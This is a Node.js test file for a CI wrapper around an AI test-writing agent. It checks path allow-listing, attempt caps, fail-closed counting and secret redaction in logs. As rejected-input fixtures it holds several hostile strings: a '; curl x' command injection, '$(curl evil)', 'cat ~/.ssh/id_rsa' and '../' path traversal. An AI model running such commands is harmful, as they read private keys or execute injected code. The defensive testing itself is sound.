import { test } from 'node:test'
import assert from 'node:assert/strict'
import { runTests, loadCounts, countsPath, MAX_RUNS } from './run-tests.mjs'
import { finalize, runSummary, decisionsStatus, runStats } from './finalize-agent.mjs'
import { validateDecisions, validateGate, validateRun } from './artifacts.mjs'
import { samples } from './test-fixtures.mjs'

test('run-tests only runs allowed test files', () => {
  const ran = []
  const run = (path) => { ran.push(path); return { code: 0, output: 'ok' } }
  assert.equal(runTests('backend/tests/a.test.ts', run).code, 0)
  for (const bad of ['backend/src/main.ts', 'backend/tests/fixture.ts', '../x.test.ts', 'backend/tests/../../x.test.ts', 'frontend/src/a.test.tsx; curl x']) {
    assert.equal(runTests(bad, run).code, 2, bad)
  }
  assert.deepEqual(ran, ['backend/tests/a.test.ts'])
})

test('run-tests caps the output it hands back to the model', () => {
  const r = runTests('backend/tests/a.test.ts', () => ({ code: 1, output: 'x\n'.repeat(5000) }))
  assert.ok(r.output.length < 20000)
})

test('finalize keeps a valid, completed decisions file', () => {
  const d = finalize({ decisions: structuredClone(samples.decisions), gate: samples.gate, exitCode: 0, log: '' })
  assert.deepEqual(validateDecisions(d), [])
  assert.equal(d.completed, true)
})

test('finalize maps a timeout to time_limit and keeps finished files', () => {
  const partial = { ...structuredClone(samples.decisions), completed: false, not_completed_reason: 'time_limit' }
  const d = finalize({ decisions: partial, gate: samples.gate, exitCode: 124, log: '' })
  assert.deepEqual([d.completed, d.not_completed_reason, d.files.length], [false, 'time_limit', 1])
})

test('finalize writes a not-completed file when the agent produced nothing or garbage', () => {
  const none = finalize({ decisions: null, gate: samples.gate, exitCode: 1, log: 'API Error: 529 overloaded' })
  assert.deepEqual([none.completed, none.not_completed_reason, none.files, none.head_sha], [false, 'model_unavailable', [], samples.gate.head_sha])
  assert.deepEqual(validateDecisions(none), [])
  const spend = finalize({ decisions: { nonsense: true }, gate: samples.gate, exitCode: 1, log: 'Your credit balance is too low / spend limit reached' })
  assert.equal(spend.not_completed_reason, 'spend_limit')
  // The per-run budget and the turn cap are the run's own attempt limits, not the workspace spend limit.
  assert.equal(finalize({ decisions: null, gate: samples.gate, exitCode: 1, log: '{"subtype":"error_max_budget_usd"}' }).not_completed_reason, 'attempt_limit')
  assert.equal(finalize({ decisions: null, gate: samples.gate, exitCode: 1, log: '{"subtype":"error_max_turns"}' }).not_completed_reason, 'attempt_limit')
  const turns = finalize({ decisions: null, gate: samples.gate, exitCode: 1, log: 'Error: Reached max turns (150)' })
  assert.equal(turns.not_completed_reason, 'attempt_limit')
})

test('finalize never trusts identity fields from the model', () => {
  const forged = { ...structuredClone(samples.decisions), head_sha: 'f'.repeat(40), run_id: 999 }
  const d = finalize({ decisions: forged, gate: samples.gate, exitCode: 0, log: '' })
  assert.deepEqual([d.head_sha, d.run_id, d.mode], [samples.gate.head_sha, samples.gate.run_id, samples.gate.mode])
})

test('finalize lists every gate file the agent did not reach when a limit stopped it (AC-12)', () => {
  const gate = structuredClone(samples.gate); gate.packages.backend.files.push('backend/src/b.ts', 'backend/src/c.ts')
  const partial = { ...structuredClone(samples.decisions), completed: false, not_completed_reason: null }
  const d = finalize({ decisions: partial, gate, exitCode: 124, log: '' })
  assert.deepEqual(validateDecisions(d), [])
  assert.deepEqual(d.files.map((f) => [f.path, f.outcome]), [['backend/src/a.ts', 'tests_written'], ['backend/src/b.ts', 'limit_reached'], ['backend/src/c.ts', 'limit_reached']])
  const none = finalize({ decisions: null, gate, exitCode: 124, log: '' })
  assert.deepEqual(none.files.map((f) => f.outcome), ['limit_reached', 'limit_reached', 'limit_reached'])
  // model unavailable: nothing is committed and the report says so as a whole; no per-file entries are invented
  assert.deepEqual(finalize({ decisions: null, gate, exitCode: 1, log: 'API Error: 529' }).files, [])
})

test('run-tests refuses more than 1 run + 3 fix attempts of one test file', () => {
  const counts = {}
  const run = () => ({ code: 1, output: 'fail' })
  for (let i = 0; i < MAX_RUNS; i++) assert.equal(runTests('backend/tests/a.test.ts', run, counts).code, 1)
  const r = runTests('backend/tests/a.test.ts', run, counts)
  assert.equal(r.code, 3)
  assert.match(r.output, /attempt limit/)
  assert.equal(runTests('backend/tests/b.test.ts', run, counts).code, 1) // per file
  assert.equal(MAX_RUNS, 4)
})

test('a missing run-count file starts at zero; a damaged one refuses every run (fail closed)', () => {
  assert.deepEqual(loadCounts(null), {})
  assert.deepEqual(loadCounts('{"backend/tests/a.test.ts":2}'), { 'backend/tests/a.test.ts': 2 })
  for (const bad of ['', 'vitest output', '[]', '{"backend/tests/a.test.ts":"x"}']) assert.equal(loadCounts(bad), null, bad)
  let ran = false
  const r = runTests('backend/tests/a.test.ts', () => { ran = true; return { code: 0, output: '' } }, null)
  assert.equal(r.code, 3)
  assert.equal(ran, false)
})

test('a clean exit without completed keeps the agent\'s stable tests as a limit, never "model unavailable"', () => {
  const gate = structuredClone(samples.gate); gate.packages.backend.files.push('backend/src/b.ts')
  const partial = { ...structuredClone(samples.decisions), completed: false, not_completed_reason: null }
  const d = finalize({ decisions: partial, gate, exitCode: 0, log: '{"subtype":"success"}' })
  assert.equal(d.not_completed_reason, 'attempt_limit')
  assert.deepEqual(d.files.map((f) => f.outcome), ['tests_written', 'limit_reached'])
  const own = finalize({ decisions: { ...partial, not_completed_reason: 'spend_limit' }, gate, exitCode: 0, log: '' })
  assert.equal(own.not_completed_reason, 'spend_limit') // any other reason the agent gives is kept
})

test('a timeout over as many files as the gate allows still yields a valid decisions file', () => {
  const gate = structuredClone(samples.gate)
  gate.packages.backend.files = Array.from({ length: 1000 }, (_, i) => `backend/src/f${i}.ts`)
  gate.packages.frontend.files = Array.from({ length: 1000 }, (_, i) => `frontend/src/f${i}.ts`)
  assert.deepEqual(validateGate(gate), [])
  const d = finalize({ decisions: null, gate, exitCode: 124, log: '' })
  assert.equal(d.files.length, 2000)
  assert.deepEqual(validateDecisions(d), [])
})

test('a run is counted and saved before it starts, so a killed run still counts', () => {
  const order = []
  runTests('backend/tests/a.test.ts', () => { order.push('run'); return { code: 0, output: '' } }, {}, (c) => order.push(`save ${c['backend/tests/a.test.ts']}`))
  assert.deepEqual(order, ['save 1', 'run'])
})

test('the run counts have no fallback location: without TEST_AGENT_RUNS every run is refused', async () => {
  assert.equal(countsPath({}), null)
  assert.equal(countsPath({ TEST_AGENT_RUNS: '' }), null)
  assert.equal(countsPath({ TEST_AGENT_RUNS: '/tmp/r.json' }), '/tmp/r.json')
  const { readFileSync } = await import('node:fs')
  const yml = readFileSync(new URL('../workflows/test-agent.yml', import.meta.url), 'utf8')
  assert.match(yml, /env -i [^\n]*\\\n\s+TEST_AGENT_RUNS="\$RUNNER_TEMP\/[\w.-]+"/)
})

test('a clean exit without a usable decisions file is an attempt limit, not "model unavailable"', () => {
  for (const decisions of [null, { nonsense: true }]) {
    const d = finalize({ decisions, gate: samples.gate, exitCode: 0, log: '{"subtype":"success"}' })
    assert.deepEqual([d.not_completed_reason, d.files.map((f) => f.outcome)], ['attempt_limit', ['limit_reached']])
  }
})

test('a spend-limit message wins over the clean-exit default', () => {
  assert.equal(finalize({ decisions: null, gate: samples.gate, exitCode: 0, log: '{"is_error":true,"result":"Credit balance is too low"}' }).not_completed_reason, 'spend_limit')
})

test('the run-tests CLI writes the count to TEST_AGENT_RUNS before running the file', async () => {
  const { spawnSync } = await import('node:child_process')
  const { mkdtempSync, mkdirSync, readFileSync } = await import('node:fs')
  const { tmpdir } = await import('node:os')
  const { join } = await import('node:path')
  const dir = mkdtempSync(join(tmpdir(), 'rt-')); mkdirSync(join(dir, 'backend'))
  const counts = join(dir, 'runs.json')
  // PATH without docker: the run itself fails, but it must already be counted.
  spawnSync(process.execPath, [new URL('./run-tests.mjs', import.meta.url).pathname, 'backend/tests/a.test.ts'], { cwd: dir, env: { TEST_AGENT_RUNS: counts, PATH: '/nonexistent' } })
  assert.deepEqual(JSON.parse(readFileSync(counts, 'utf8')), { 'backend/tests/a.test.ts': 1 })
})

test('the run summary logs counts and denied tools only, never the conversation or file content', () => {
  const result = { type: 'result', subtype: 'error_max_turns', is_error: true, num_turns: 200, total_cost_usd: 1.2345, result: 'SECRET-ish model text',
    permission_denials: [{ tool_name: 'Write', tool_use_id: 'x', tool_input: { file_path: '/w/.test-agent/decisions.json', content: 'SECRET-ish content' } }, { tool_name: 'Bash', tool_input: { command: 'cat ~/.ssh/id_rsa' } }] }
  const s = runSummary(`${JSON.stringify(result)}\nsome stderr line\n`)
  assert.equal(s, 'claude: subtype=error_max_turns turns=200 cost_usd=1.23 denials=2 (Write .test-agent/decisions.json, Bash cat)')
  assert.ok(!/SECRET|ssh|id_rsa/.test(s))
  assert.equal(runSummary('model token exchange failed\n'), 'claude: no result (see the step log)')
})

test('the decisions file status names schema problems by field path, without values', () => {
  assert.equal(decisionsStatus(null), 'decisions.json: missing or not JSON')
  assert.equal(decisionsStatus(structuredClone(samples.decisions)), 'decisions.json: valid')
  const bad = { ...structuredClone(samples.decisions), completed: 'yes', extra: 'SECRET-ish' }
  bad.files[0].outcome = 'done SECRET-ish'
  const s = decisionsStatus(bad)
  assert.match(s, /^decisions\.json: invalid \(3\): /)
  assert.match(s, /decisions\.completed: not a boolean/)
  assert.match(s, /decisions\.files\[0\]\.outcome/)
  assert.match(s, /decisions\.extra: unknown field/)
  assert.ok(!s.includes('SECRET'))
})

test('a denied Bash call is logged with its program name only', () => {
  const result = { type: 'result', subtype: 'success', num_turns: 3, total_cost_usd: 0.01, permission_denials: [{ tool_name: 'Bash', tool_input: { command: 'npx vitest run tests/x.test.ts && echo SECRET' } }, { tool_name: 'Bash', tool_input: { command: '$(curl evil)' } }] }
  assert.equal(runSummary(JSON.stringify(result)), 'claude: subtype=success turns=3 cost_usd=0.01 denials=2 (Bash npx, Bash)')
})

test('the agent runs tests only through the runner copied into the working copy (Claude Code denies ../ paths)', async () => {
  const { readFileSync } = await import('node:fs')
  const read = (p) => readFileSync(new URL(p, import.meta.url), 'utf8')
  const allowBash = JSON.parse(read('../test-agent/claude-settings.json')).permissions.allow.filter((r) => r.startsWith('Bash('))
  assert.deepEqual(allowBash, ['Bash(node .test-agent/bin/run-tests.mjs *)'])
  for (const doc of ['../../.claude/agents/test-agent.md', '../../.claude/skills/backend-unit-tests/SKILL.md', '../../.claude/skills/frontend-unit-tests/SKILL.md']) {
    const text = read(doc)
    assert.match(text, /node \.test-agent\/bin\/run-tests\.mjs /, doc)
    assert.ok(!/run-tests\.mjs/.test(text.replace(/node \.test-agent\/bin\/run-tests\.mjs/g, '')), `${doc} names another runner path`)
  }
  const yml = read('../workflows/test-agent.yml')
  assert.match(yml, /rm -rf repo\/\.test-agent/) // nothing the pull request committed there survives
  assert.match(yml, /cp ((?:\.\.\/)?main\/\.github\/scripts\/(?:run-tests|rules|sandbox)\.mjs ){3}\.test-agent\/bin\//)
})

test('a time_limit the agent wrote itself is not a time limit unless the run was cut off', () => {
  const d = finalize({ decisions: { ...structuredClone(samples.decisions), completed: false, not_completed_reason: 'time_limit', files: [] }, gate: samples.gate, exitCode: 0, log: '' })
  assert.equal(d.not_completed_reason, 'attempt_limit')
  assert.equal(finalize({ decisions: { ...structuredClone(samples.decisions), completed: false, not_completed_reason: 'time_limit' }, gate: samples.gate, exitCode: 124, log: '' }).not_completed_reason, 'time_limit')
})

test('runStats keeps only the counts publish may show: subtype, turns, cost, denials', () => {
  const log = JSON.stringify({ type: 'result', subtype: 'success', num_turns: 14, total_cost_usd: 0.0612, result: 'text', permission_denials: [{ tool_name: 'Bash' }] })
  assert.deepEqual(runStats(log, samples.gate), { schema: 'test_agent.run.v1', run_id: 1, mode: 'pull_request', head_sha: samples.gate.head_sha, subtype: 'success', turns: 14, cost_usd: 0.0612, denials: 1 })
  assert.equal(runStats('model token exchange failed', samples.gate), null)
  assert.deepEqual(validateRun(runStats(log, samples.gate)), [])
  assert.ok(validateRun({ ...runStats(log, samples.gate), subtype: 'x'.repeat(100) }).length)
  assert.ok(validateRun({ ...runStats(log, samples.gate), note: 'hi' }).length)
})
